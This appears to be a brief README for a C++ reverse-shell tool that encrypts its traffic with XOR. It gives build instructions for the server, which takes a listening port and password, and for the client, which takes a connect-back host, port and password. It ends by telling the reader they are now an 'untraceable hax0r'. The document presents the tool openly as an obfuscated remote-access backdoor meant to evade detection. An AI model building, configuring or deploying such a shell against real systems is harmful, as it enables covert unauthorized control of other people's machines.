### Ciphered Reverse Shell using XOR

By using pipes, vfork and execve its posible to manipulate interactively input and output of desired program.

### Building

Open `Server.cpp` and modify the following line:
```cpp
 Server *Srv = new Server(LISTENING-PORT, YOUR-PASSWORD);
```
Save and build with `make server`.

Open `Client.cpp`, first modify `Client` class:
```cpp
class Client{
        private:
                std::string strPassword = YOUR-PASSWORD;

```
Now on `main` specify where client its going to connect:
```cpp
if(Cli->Connect(HOST, PORT)){

```
Save and build with `make client`.


Now you are a untraceable hax0r :v
